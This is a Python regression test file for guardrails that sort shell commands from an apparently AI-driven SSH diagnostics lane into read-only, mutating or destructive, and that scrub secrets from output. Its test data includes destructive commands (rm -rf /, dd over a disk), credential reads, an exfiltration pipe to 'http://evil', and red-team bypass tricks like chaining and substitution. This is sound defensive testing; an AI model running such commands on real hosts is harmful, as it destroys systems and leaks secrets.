"""Binary gate for the reasoning-blind SSH-ops guardrails (offline; no network / no SSH).

Run:  python test_guardrails.py   ->  exits non-zero on ANY miss (CI gate).

Covers the original tiers, the DESIGN-production.md §4 corpus, AND every confirmed finding from
TWO adversarial red-team rounds (each locked here as a regression guard) — both residual bypasses
(too-safe tier / leaked secret) and false-positives (legit diagnostic wrongly refused or
over-redacted). A regression means an unvetted command reaches a live root shell, a secret reaches
the model/SSE/DB, OR the lane's own diagnostics get destroyed.

Secret-shaped fixtures are assembled by runtime concatenation so this source carries no complete
secret literal (keeps scripts/secret_scan.ps1 green).
"""
import base64
from guardrails import classify, scrub_output

CLASSIFY_CASES = [
    # --- read_only: curated one-shot diagnostics auto-run ---
    ("nvidia-smi", "read_only"),
    ("nvidia-smi -q", "read_only"),
    ("nvidia-smi --query-gpu=memory.used --format=csv", "read_only"),
    ("nvidia-smi -q -d MEMORY", "read_only"),
    ("df -h /", "read_only"),
    ("free -h", "read_only"),
    ("free -c 5", "read_only"),                       # bounded repeat (not -s stream)
    ("uptime", "read_only"),
    ("ps aux", "read_only"),
    ("ps -ef", "read_only"),                          # dashed -e = all procs (NOT env)
    ("ps -f", "read_only"),                           # r2 FP: -f != follow for ps
    ("ps -f -u root", "read_only"),
    ("ps -o pid,comm", "read_only"),                  # safe format spec
    ("ss -tlnp", "read_only"),
    ("lscpu", "read_only"),
    ("lsblk", "read_only"),
    ("lsblk -f", "read_only"),                        # r2 FP: -f = --fs, not follow
    ("hostname", "read_only"),
    ("ip addr show", "read_only"),
    ("top -bn1", "read_only"),
    ("vmstat", "read_only"),
    ("vmstat 1 5", "read_only"),                      # delay+count = bounded
    ("iostat -dd", "read_only"),                      # r2 FP: -dd flag, not `dd` wipe
    ("dmesg", "read_only"),
    ("dmesg -T", "read_only"),
    ("systemctl status ssh", "read_only"),
    ("journalctl -u docker --no-pager -n 100", "read_only"),
    ("journalctl -xe", "read_only"),                  # r2 FP: -e is a bound
    ("journalctl -u vllm -n 100 -e", "read_only"),
    ("docker ps", "read_only"),
    ("pip list", "read_only"),
    ("jupyter --version", "read_only"),
    ("dd --version", "read_only"),                    # r2 FP: help/version always safe
    ("usermod --help", "read_only"),
    ("df /etc/passwd", "read_only"),                  # r2 FP: df reads fs, not the file
    # curated SAFE exact reads (the ONLY auto-run file surface)
    ("cat /proc/meminfo", "read_only"),
    ("head /etc/os-release", "read_only"),
    ("stat /etc/os-release", "read_only"),
    ("cat /usr/local/cuda/version.txt", "read_only"),

    # --- /var/log/ is a SECRET SINK -> file reads there no longer auto-run ---
    ("cat /var/log/cloud-init-output.log", "mutating"),
    ("cat /var/log/auth.log", "mutating"),
    ("strings /var/log/cloud-init.log", "mutating"),
    ("cat /var/log/syslog", "mutating"),
    ("tail -n 100 /var/log/vllm.log", "mutating"),
    ("ls /var/log", "mutating"),

    # --- secret/credential EXFIL must NOT auto-run ---
    ("cat /root/.ssh/id_rsa", "mutating"),
    ("env", "mutating"),
    ("printenv", "mutating"),
    ("systemctl show vllm", "mutating"),
    ("cat /proc/self/environ", "mutating"),
    ("ls /root/.ssh", "mutating"),
    ("cat secrets", "mutating"),
    ("ps auxe", "mutating"),                          # BSD `e` dumps env
    ("ps eww", "mutating"),
    ("ps -o environ", "mutating"),                    # r2 CRIT: -o environ column dumps env
    ("ps -o pid,environ", "mutating"),
    ("ps -oenviron", "mutating"),                     # r3 CRIT: glued column-spec form
    ("ps -o=environ", "mutating"),
    ("ps -eoenviron", "mutating"),
    ("stat /etc/passwd", "mutating"),                 # r2: metadata read, refused not destructive
    ("getent passwd", "mutating"),                    # r3 FP: passwd as ARG, not the command

    # --- expansion / glob / quote -> not auto-run ---
    ("cat $SECRET_FILE", "mutating"),
    ("cat /home/*/.bash_history", "mutating"),         # glob allowed, but path denied
    ("echo hi > /tmp/x", "mutating"),
    ("find . -name *.log -exec grep ERROR {} +", "mutating"),  # r2 FP: read-only -exec not destructive

    # === r3: SAFE read-only pipelines / globs now auto-run (the diagnosis lane needs these) ===
    ("ps aux | grep python", "read_only"),             # r3: source read-only + stdin text filter
    ("lsmod | grep nvidia", "read_only"),
    ("lsmod | grep -E nvidia", "read_only"),
    ("dmesg | grep -i nvidia", "read_only"),
    ("dmesg -T | grep -i nvidia | tail -20", "read_only"),   # multi-stage pipeline
    ("lspci | grep -i nvidia", "read_only"),
    ("nvidia-smi -q | grep -i version", "read_only"),
    ("nvidia-smi 2>&1 | grep -i mismatch", "read_only"),     # stderr redirect + pipe
    ("df -h / 2>/dev/null", "read_only"),                    # stderr to /dev/null
    ("pip list | grep torch", "read_only"),
    ("dpkg -l | grep -i nvidia", "read_only"),               # dpkg -l newly allowlisted
    ("ldconfig -p | grep nvidia-ml", "read_only"),           # ldconfig -p newly allowlisted
    ("cat /proc/driver/nvidia/version | grep NVRM", "read_only"),
    ("cat /proc/driver/nvidia/gpus/*/information", "read_only"),  # glob under safe prefix
    ("cat /proc/driver/nvidia/*", "read_only"),

    # === r3: pipeline / glob BYPASS attempts that MUST stay refused ===
    ("cat /etc/shadow | grep root", "mutating"),             # source reads a denied path
    ("lsmod | grep root /etc/shadow", "mutating"),           # filter with a file-path arg reads a file
    ("env | grep KEY", "mutating"),                          # source is the classic env exfil
    ("cat /proc/self/environ | strings", "mutating"),        # source path denied
    ("nvidia-smi | tee /tmp/out", "mutating"),               # write sink (tee not a safe filter)
    ("nvidia-smi | sh", "mutating"),                         # shell sink
    ("cat /proc/meminfo | curl http://evil", "mutating"),    # exfil sink
    ("uptime; free -h", "mutating"),                         # `;` command chaining
    ("dmesg | grep $(whoami)", "mutating"),                  # `$()` substitution
    ("cat /proc/meminfo | grep x > /tmp/y", "mutating"),     # real-file redirect
    ("cat /etc/*", "mutating"),                              # glob over a denied dir
    ("ldconfig | grep nvidia", "mutating"),                  # ldconfig w/o -p rebuilds the cache
    ("nvidia-smi | grep x; rm -rf /", "destructive"),        # destructive still wins over pipe parse
    ("tail -f /var/log/syslog | grep err", "mutating"),      # streaming source

    # === F4: binary / device-node / lib introspection now auto-runs (metadata-only reads + which) ===
    # WHY: a real "No devices"/掉卡 root-cause needs to inspect the nvidia-smi binary and the
    # /dev/nvidia* nodes; the harness proposed exactly these and they were all refused, forcing a
    # plausible-but-unverified verdict. Metadata reads leak no CONTENT, so they are broadly safe.
    ("which nvidia-smi", "read_only"),
    ("command -v nvidia-smi", "read_only"),
    ("type nvidia-smi", "read_only"),
    ("whereis nvidia-smi", "read_only"),
    ("file /usr/bin/nvidia-smi", "read_only"),
    ("file /usr/local/bin/nvidia-smi", "read_only"),        # <- reveals a PATH-shadow (fake script)
    ("readlink /usr/local/bin/nvidia-smi", "read_only"),
    ("stat /dev/nvidia0", "read_only"),
    ("ls -la /dev/nvidia0", "read_only"),
    ("ls /dev/nvidia*", "read_only"),                       # glob under a meta-safe prefix
    ("md5sum /usr/local/bin/nvidia-smi", "read_only"),      # hash to fingerprint a replaced binary
    ("du -sh /usr/lib/x86_64-linux-gnu", "read_only"),
    ("cat /proc/modules", "read_only"),                     # module list (container-safe content)
    ("cat /proc/devices", "read_only"),
    ("cat /proc/1/cgroup", "read_only"),                    # container detection
    ("cat /proc/self/cgroup", "read_only"),
    ("cat /sys/module/nvidia/version", "read_only"),
    ("cat /sys/bus/pci/devices/0000:e1:00.0/vendor", "read_only"),
    ("ls -la /dev/nvidia* 2>&1 | grep nvidia", "read_only"),  # meta+glob source into a text filter

    # === F4 bypass attempts that MUST stay refused (content bytes / exec / secrets) ===
    ("cat /dev/sda", "mutating"),                           # CRITICAL: raw-disk CONTENT read stays refused
    ("cat /dev/nvidia0", "mutating"),                       # don't dump a device node's bytes
    ("ldd /usr/bin/nvidia-smi", "mutating"),                # ldd runs the loader on the target -> exec risk
    ("strings /usr/lib/x86_64-linux-gnu/libnvidia-ml.so.1", "mutating"),  # content reader stays narrow
    ("cat /proc/1/environ", "mutating"),                    # env leak
    ("cat /proc/self/cmdline", "mutating"),                 # argv leak (cmdline excluded from pid-safe)
    ("stat /etc/shadow", "mutating"),                       # deny-substr wins even for metadata
    ("file /root/.ssh/id_rsa", "mutating"),                 # deny-substr
    ("ls /root", "mutating"),                               # deny-substr (/root)
    ("md5sum /etc/shadow", "mutating"),
    ("file $(which nvidia-smi)", "mutating"),               # $() substitution still blocked
    ("which nvidia-smi; rm -rf /", "destructive"),          # chaining + destructive wins

    # --- streaming / hang variants must NOT auto-run ---
    ("tail -f /var/log/syslog", "mutating"),
    ("journalctl -f", "mutating"),
    ("journalctl", "mutating"),
    ("journalctl --no-pager", "mutating"),
    ("top -b", "mutating"),
    ("vmstat 1", "mutating"),
    ("vmstat 2 0", "mutating"),                       # r2: count=0 = infinite
    ("vmstat 1.5", "mutating"),                       # r2: non-integer interval
    ("iostat 1 0", "mutating"),
    ("netstat -c", "mutating"),
    ("netstat -tlnpc", "mutating"),                   # r2: bundled -c
    ("free -s 1", "mutating"),
    ("free -hs1", "mutating"),                        # r2: bundled -s
    ("nvidia-smi dmon", "mutating"),
    ("nvidia-smi pmon", "mutating"),

    # --- genuine mutating -> needs confirm ---
    ("systemctl restart vllm", "mutating"),
    ("pip install torch", "mutating"),
    ("mkdir /data/models", "mutating"),
    ("docker restart trainer", "mutating"),
    ("top", "mutating"),
    ("kill -9 1234", "mutating"),                     # killing a user PID is mutating, not destructive
    ("pkill -9 python", "mutating"),
    ("frobnicate --all", "mutating"),

    # --- destructive -> hard refuse, checked FIRST ---
    ("rm -rf /tmp/x", "destructive"),
    ("dd if=/dev/zero of=/dev/sda", "destructive"),
    ("mkfs.ext4 /dev/vdb", "destructive"),
    ("sgdisk -Z /dev/sda", "destructive"),
    ("reboot", "destructive"),
    ("shutdown -h", "destructive"),                   # r3 CRIT: -h is --halt on power binaries, not help
    ("reboot -h", "destructive"),
    ("poweroff -h", "destructive"),
    ("/usr/bin/passwd root", "destructive"),          # r3: path-qualified passwd binary
    ("sudo passwd root", "destructive"),
    ("chmod -R 777 /", "destructive"),
    ("RM -rf /", "destructive"),
    ("find /data -delete", "destructive"),
    ("find /tmp -exec rm {} +", "destructive"),       # mutating inner cmd -> still destructive
    ("cp /dev/null /boot/vmlinuz", "destructive"),
    ("sed -i s/a/b/ /etc/fstab", "destructive"),
    ("sshpass -p hunter2 ssh u@h", "destructive"),
    ("passwd newuser", "destructive"),                # passwd COMMAND still caught (not /etc/passwd path)
    ("export AWS_SECRET_KEY=abc", "destructive"),
    ("nvidia-smi; rm -rf /", "destructive"),
    ("kill -9 1", "destructive"),
    ("kill -SIGKILL 1", "destructive"),
    ("killall sshd", "destructive"),
    ("lvremove -y /dev/vg0/data", "destructive"),
    ("zpool destroy tank", "destructive"),
    ("kubectl delete namespace prod", "destructive"),
    ("docker system prune -af --volumes", "destructive"),
    ("install -m 000 /dev/null /etc/resolv.conf", "destructive"),
    ("echo x > /var/lib/mysql/ibdata1", "destructive"),
    ("chattr +i /var/lib/docker", "destructive"),
    ("systemctl stop ssh", "destructive"),
    ("swapoff -a", "destructive"),
]


def run_classify():
    misses = []
    for cmd, want in CLASSIFY_CASES:
        got = classify(cmd)
        if got != want:
            misses.append((cmd, want, got))
            print(f"XX  classify({cmd!r}) = {got}  (want {want})")
    print(f"classify: {len(CLASSIFY_CASES) - len(misses)}/{len(CLASSIFY_CASES)} passed")
    return misses


def run_scrub():
    misses = []

    def gone(name, text, must_be_gone, secrets=()):
        out = scrub_output(text, secrets=secrets)
        leaked = [g for g in must_be_gone if g in out]
        if leaked:
            misses.append((name, leaked, out))
            print(f"XX  scrub[{name}] LEAKED={leaked}")

    def stays(name, text, must_stay):
        out = scrub_output(text)
        lost = [s for s in must_stay if s not in out]
        if lost:
            misses.append((name, lost, out))
            print(f"XX  scrub[{name}] OVER-REDACTED, lost={lost}")

    # --- secrets that MUST be redacted ---
    pw = "Pl4in" + "Pwd77x"
    b64 = base64.b64encode(pw.encode()).decode()
    gone("literal-credential", f"connecting with {pw} now", [pw], secrets=[pw, b64])
    gone("base64-credential", f"blob {b64} end", [b64], secrets=[pw, b64])

    sk = "sk-" + "proj-" + "Ab12" * 5
    stripe = "sk_" + "live_" + "4eC39HqLyjWDarjtT1zdp7dc"
    dsn_pw = "h0tP" + "ass99"
    aws = "wJalr" + "XUtnFE" + "MIK7MD" + "ENGbPx"
    hf = "hf_" + "Ab1Cd2" * 4
    npm = "npm_" + "xY9zAbC" + "1234567890defGHI"
    slack = "xoxb-" + "2401234567-2409876543210-" + "AbCdEfGhIjKlMnOp"
    ghpat = "github" + "_pat_" + "11ABCDEFG0" + "abcdefghij" + "Kl1234567890mnop"
    glpat = "glpat" + "-" + "abcdefghij1234567890"
    gone("openai-sk", f"LLM_API_KEY={sk}", [sk])
    gone("stripe-sk_", f"charge with {stripe} now", [stripe])
    gone("mysql-dsn", f"MYSQL_DSN=root:{dsn_pw}@tcp(127.0.0.1:3306)/db", [dsn_pw])
    gone("aws-secret", f"AWS_SECRET_ACCESS_KEY={aws}", [aws])
    gone("hf-token", f"HF_TOKEN={hf}", [hf])
    gone("npm-token", f"_authToken={npm}", [npm])
    gone("slack-xox", f"SLACK_BOT {slack}", [slack])
    gone("github-pat", f"using {ghpat} to clone", [ghpat])     # r2 leak
    gone("gitlab-pat", f"token {glpat} set", [glpat])          # r2 leak

    gone("dsn-url-creds", f"DATABASE_URL=postgres://u:{dsn_pw}@h:5432/db", [dsn_pw])
    gone("redis-empty-user", f"redis://:{dsn_pw}@10.0.0.1:6379", [dsn_pw])
    gone("schemeless-userpass", f"deploy@1.2.3.4:{dsn_pw}@host", [dsn_pw])
    gone("mysql-inline-p", f"connecting: mysql -uroot -p{dsn_pw}", [dsn_pw])

    prose_pw = "Sup3r" + "ValidPass2024"
    lowerhex = "7f3a9c2e8b1d4056"
    jhex = "deadbeefcafe1234567890abcdef00112233"
    gone("prose-password-colon", f"plaintext password set to: {prose_pw}", [prose_pw])
    gone("prose-password-is", f"DB host=db user=admin password is {dsn_pw}", [dsn_pw])
    gone("prose-password-word", "the root password is swordfish today", ["swordfish"])  # r2: short dict word
    gone("lowerhex-near-keyword", f"db password reset to {lowerhex}", [lowerhex])
    gone("jupyter-token-prose", f"+ echo Setting jupyter token to {jhex}", [jhex])
    gone("server-auth-env", f"1 ? Ss 0:01 node SERVER_AUTH={dsn_pw}xyz", [f"{dsn_pw}xyz"])
    gone("auth-keyword", "AUTH=supersecretvalue123", ["supersecretvalue123"])
    keyhex = "5f4dcc3b5aa765d61d8327deb882cf99"
    gone("keyword-adjacent-hex", f"db password {keyhex} here", [keyhex])  # r3: no separator, no verb

    jwt = "eyJhbGciOiJIUzI1NiJ9." + "eyJ1c2VyIjoiYWRtaW4ifQ." + "SflKxwRJSMeKKF2QT4"
    gone("jwt", f"Authorization: {jwt}", [jwt])
    bearer = "Ab12Cd34" + "Ef56Gh78"
    gone("bearer", f"Authorization: Bearer {bearer}", [bearer])
    gone("otp-digits", "OTP is 918273645", ["918273645"])
    pem_body = "MIIE" + "FakeKeyData" + "1234567890"
    gone("pem-block",
         f"-----BEGIN RSA PRIVATE KEY-----\n{pem_body}\n-----END RSA PRIVATE KEY-----", [pem_body])
    blob = "Ab1" * 14
    gone("high-entropy-b64", f"found {blob} done", [blob])

    # --- legitimate diagnostic output that MUST be PRESERVED (r2 over-redaction guards) ---
    stays("gpu-stats", "GPU 0: NVIDIA RTX 4090, driver 570.153.02, 24576 MiB, util 12%",
          ["570.153.02", "24576 MiB"])
    stays("gpu-uuid", "GPU-1a2b3c4d-5e6f-7890-abcd-ef1234567890",
          ["GPU-1a2b3c4d-5e6f-7890-abcd-ef1234567890"])
    stays("load-avg", "Up 5 days, load average 0.10 0.20 0.30", ["0.10 0.20 0.30"])
    stays("keyerror", "KeyError: missing key driver in config", ["missing key driver in config"])
    stays("public-key-algos", "public_key_algorithms: ssh-rsa,ssh-ed25519", ["ssh-rsa,ssh-ed25519"])
    stays("ssh-auth-log",
          "Jun 25 host sshd[123]: pam_unix(sshd:auth): authentication failure; uid=0 rhost=10.0.0.5 user=root",
          ["authentication failure", "rhost=10.0.0.5", "user=root"])
    stays("ssh-accept-log", "Accepted password for root from 1.2.3.4 port 22 ssh2",
          ["Accepted password for root", "1.2.3.4"])
    stays("sha256sum", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  model.bin",
          ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"])
    stays("git-commit", "commit a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
          ["a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0"])
    stays("docker-image-id", "Image ID  9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c",
          ["9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c"])
    fp = "abcdef1234567890ABCDEFghijklmnop0123"
    stays("ssh-fingerprint", f"256 SHA256:{fp} root@host (ED25519)", [fp])
    stays("keyring-version", "keyring: 23.0.1", ["23.0.1"])
    stays("host-key-path", "host key: /etc/ssh/ssh_host_ed25519_key.pub found",
          ["/etc/ssh/ssh_host_ed25519_key.pub"])
    stays("authorized-keys-count", "SSH authorized_keys check: 3 keys present", ["3 keys present"])
    stays("prose-not-greedy", "The password is set. Then we run systemctl restart and check logs",
          ["systemctl restart and check logs"])           # r3: prose tail no longer wholesale-redacted

    print(f"scrub: misses={len(misses)}")
    return misses


def main():
    cmiss = run_classify()
    smiss = run_scrub()
    if cmiss or smiss:
        print(f"\nFAIL: {len(cmiss) + len(smiss)} regression(s)")
        raise SystemExit(1)
    print("\nALL GREEN")


if __name__ == "__main__":
    main()
